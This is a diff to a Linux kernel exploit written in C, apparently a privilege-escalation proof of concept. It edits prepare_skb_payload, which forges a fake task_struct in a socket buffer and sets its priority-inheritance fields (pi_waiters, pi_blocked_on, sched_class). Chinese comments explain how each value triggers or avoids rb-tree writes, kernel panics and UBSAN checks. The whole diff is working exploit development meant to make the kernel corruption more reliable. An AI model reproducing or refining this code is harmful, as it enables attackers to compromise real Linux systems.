@@ -680,12 +680,10 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
     put32(p, FAKE_TASK_OFF + pi_lock_off, 0);
     if (payload_mode == PAGE_PAYLOAD_FOPS) {
-      /* POC-pad7U: pi_waiters 指向 fake_w0 的 pi_tree 节点
-       * 让 pi_waiters 树非空 → rb_insert 触发重平衡 → 写入 parent */
-      put64(p, FAKE_TASK_OFF + pi_waiters_off,
-            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
-      put64(p, FAKE_TASK_OFF + pi_waiters_off + 0x08,
-            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
+      /* Linuxoid-cn: pi_waiters 为空树 → 不触发 rb_erase → 避免内核 panic
+       * pi_blocked_on = 0 → 不在 fake task 上挂 waiter */
+      put64(p, FAKE_TASK_OFF + pi_waiters_off, 0);
+      put64(p, FAKE_TASK_OFF + pi_waiters_off + 0x08, 0);
     } else {
       put64(p, FAKE_TASK_OFF + pi_waiters_off,
             fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
@@ -694,11 +692,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     }
     put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
     put64(p, FAKE_TASK_OFF + pi_top_task_off, pi_top_task);
-    put64(p, FAKE_TASK_OFF + pi_waiters_off,
-            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
-    put64(p, FAKE_TASK_OFF + pi_waiters_off + 0x08,
-            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
-    put64(p, FAKE_TASK_OFF + pi_blocked_on_off, fake_w0);
+    put64(p, FAKE_TASK_OFF + pi_blocked_on_off, 0);
     /* violin: 设置 sched_class 指向 fair_sched_class
      * UBSAN 类型哈希检查读取 sched_class->type_hash
      * 如果 sched_class = 0 (全零页面) → 哈希不匹配 → BRK #0x8228 → panic */
